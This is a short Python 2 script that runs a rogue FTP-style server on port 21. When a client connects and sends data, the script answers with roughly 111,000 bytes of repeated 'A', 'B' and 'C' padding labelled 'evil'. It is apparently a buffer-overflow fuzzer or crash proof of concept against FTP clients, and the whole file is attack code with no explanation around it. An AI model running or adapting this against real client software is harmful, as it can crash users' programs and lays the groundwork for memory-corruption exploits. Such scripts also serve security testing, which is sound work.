#!/usr/bin/env python


import socket

HOST = '127.0.0.1' # 10.0.0.5
PORT = 21

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()
print 'Connection from', addr
while True:
    data = conn.recv(1024)
    if not data:
        break
    evil  = "A" * 100000
    evil += "B" * 10000
    evil += "C" * 1000
    conn.sendall(evil+'\n')
    s.close()
